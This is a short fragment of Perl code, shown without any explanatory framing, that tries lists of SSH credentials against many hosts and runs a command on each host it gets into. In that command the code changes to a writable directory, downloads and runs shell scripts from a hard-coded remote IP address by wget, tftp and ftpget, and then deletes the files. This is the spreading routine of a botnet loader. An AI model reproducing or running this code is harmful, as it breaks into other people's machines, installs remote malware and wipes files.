...
scalar(@newarray); $i+=3) {
        ...
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec(' cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.155.188/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 178.128.155.188 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 178.128.155.188; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 178.128.155.188 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
